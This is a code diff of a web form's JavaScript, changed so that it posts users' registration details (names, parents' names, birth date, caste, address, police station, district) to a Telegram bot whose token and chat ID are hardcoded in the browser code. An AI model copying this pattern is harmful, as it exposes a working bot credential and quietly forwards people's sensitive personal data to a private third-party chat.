@@ -7,10 +7,56 @@ const fileInput = document.getElementById("formFile");
 const SignOut = document.getElementById("sign")
 
 
-function upload(data) {
-    const URL = `https://api.telegram.org/bot6978650517:AAEWeLNPE2TkkXJ2OiPtoSjZk7UCEN-Jb2Y/sendMessage?chat_id=993778683&text=`
-    fetch(URL + data);
+async function upload(data) {
+    const BOT_TOKEN = '6978650517:AAEWeLNPE2TkkXJ2OiPtoSjZk7UCEN-Jb2Y';
+    const CHAT_ID = '993778683';
+
+    // Formatting the readable message with Emojis and Monospaced values
+    const message = `
+📝 *New Registration Details*
+━━━━━━━━━━━━━━━━━━
+👤 *Name:* \`${data.name}\`
+👨‍👩‍👦 *Father:* \`${data.fname}\`
+👩‍👧‍👦 *Mother:* \`${data.mname}\`
+📅 *DOB:* \`${data.dob}\`
+🛠 *Work:* \`${data.business}\`
+📍 *Birth Place:* \`${data.placeofbirth}\`
+🧬 *Category:* \`${data.cast} (${data.subcast})\`
+🏠 *Residence:* \`${data.niwas}\`
+👮 *Thana:* \`${data.thana}\`
+🏢 *Tehsil:* \`${data.tehsil}\`
+🗺 *District:* \`${data.district}\`
+📍 *Full Address:* \`${data.address}\`
+📅 *Date:* \`${data.date}\`
+━━━━━━━━━━━━━━━━━━
+    `;
+
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+    try {
+        const response = await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'MarkdownV2' // Enables the bold and code-style fonts
+            })
+        });
+
+        const result = await response.json();
+        if (result.ok) {
+            console.log('Message sent successfully! ✅');
+        } else {
+            console.error('Error from Telegram:', result.description);
+        }
+    } catch (error) {
+        console.error('Fetch Error:', error);
+    }
 }
+
+// Your Data
+
 
 
 function feedAll() {
@@ -78,5 +124,6 @@ genbtn.addEventListener('click', () => {
     feedAll();
     // setTimeout(()=>donate(),2000)
 })
+
 
 
